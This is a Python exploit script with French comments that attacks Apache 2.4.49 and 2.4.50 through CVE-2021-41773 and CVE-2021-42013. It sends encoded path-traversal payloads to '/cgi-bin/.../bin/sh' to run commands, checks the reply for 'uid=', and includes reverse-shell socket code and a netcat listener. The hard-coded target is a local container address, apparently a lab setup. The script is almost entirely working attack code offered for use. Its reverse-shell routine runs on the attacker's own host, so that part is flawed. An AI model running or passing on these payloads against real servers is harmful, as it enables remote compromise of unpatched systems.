import sys
import requests
import argparse
import urllib
import subprocess
import socket
import os

# User-Agent
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"

# Instructions d'utilisation
utilisation = "\n- cve-2021-42013.py -l <port> -e <commande>"
description = "cve-2021-42013.py est un script python pour éxploiter la vulnérabilité d'exécution de code à distance dans Apache 2.4.49 et 2.4.50"

# Analyseur d'arguments
parser = argparse.ArgumentParser(usage=utilisation, description=description)
parser.add_argument("-l", dest="listen_port", type=int, help="Port pour écouter la connexion du reverse shell")
parser.add_argument("-e", dest="command", type=str, help="Commande à exécuter après l'exploit (reverse shell par défaut)")
args = parser.parse_args()

# Adresse IP et port du serveur pour le shell inversé
reverse_ip = None
reverse_port = 4444

# Vérifiez le format d'URL valide et la connexion
def urlCheck(url):
    try:
        resp = requests.head(url, headers={"User-Agent": user_agent})
        return resp
    except (requests.exceptions.RequestException, requests.exceptions.InvalidURL) as e:
        print("\n[-] Une erreur s'est produite lors de la connexion à l'URL :", e)
        sys.exit()

def exploitRCE(url, payload, cve_id):
    payload = url + urllib.parse.quote(payload, safe="/%")
    data = "echo;id"
    data = data.encode("ascii")
    print("[+] Exécution du payload " + payload)
    try:
        request = urllib.request.Request(payload, data=data, headers={"User-Agent": user_agent})
        response = urllib.request.urlopen(request)
        res = response.read().decode("utf-8")
        if "uid=" in res:
            print("[!] " + url + " est vulnérable à une attaque d'exécution de code à distance (" + cve_id + ")")
            print("[+] Réponse:")
            print(res)
            if reverse_ip:
                if reverse_shell(reverse_ip, reverse_port):
                    print("[+] Shell inversé établi avec succès!")
                else:
                    print("[!] Impossible d'établir un shell inversé.")
        else:
            print("[!] " + url + " n'est pas vulnérable à " + cve_id + "\n")
    except urllib.error.HTTPError:
        print("[!] " + url + " n'est pas vulnérable à " + cve_id + "\n")

def RCE(url):
    resp = urlCheck(url)
    version = resp.headers.get('server', '')
    if "49" in version:
        cve_id = "CVE-2021-41773"
        payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
        exploitRCE(url, payload, cve_id)
    elif "50" in version:
        cve_id = "CVE-2021-42013"
        payload = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
        exploitRCE(url, payload, cve_id)
    else:
        cve_id = "CVE-2021-41773"
        payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
        exploitRCE(url, payload, cve_id)
        if not "49" in version and not "50" in version:
            cve_id = "CVE-2021-42013"
            payload = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
            exploitRCE(url, payload, cve_id)

def reverse_shell(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        print("[+] Connexion établie vers " + ip + ":" + str(port))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        p = subprocess.call(["/bin/sh", "-i"])
        s.close()
        return True
    except Exception as e:
        print("[!] Erreur lors de la connexion au shell inversé:", e)
        return False

def start_listener(port):
    try:
        subprocess.Popen(["nc", "-lvp", str(port)])
        print("[+] Serveur d'écoute démarré sur le port", port)
    except Exception as e:
        print("[!] Erreur lors du démarrage du serveur d'écoute:", e)

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        print("[!] Impossible de récupérer l'adresse IP locale:", e)
        return None

def main():
    global reverse_ip
    if args.listen_port:
        reverse_port = args.listen_port
    else:
        reverse_port = 4444

    if args.command:
        print("[+] Exécution de la commande personnalisée:", args.command)
        subprocess.run(args.command.split())

    reverse_ip = get_local_ip()
    print("[+] Adresse IP locale:", reverse_ip)

    RCE("http://172.17.0.2:81/")  # Modifier l'URL si nécessaire

    # Démarrez le serveur d'écoute si l'exploit réussit
    start_listener(reverse_port)

if __name__ == "__main__":
    main()
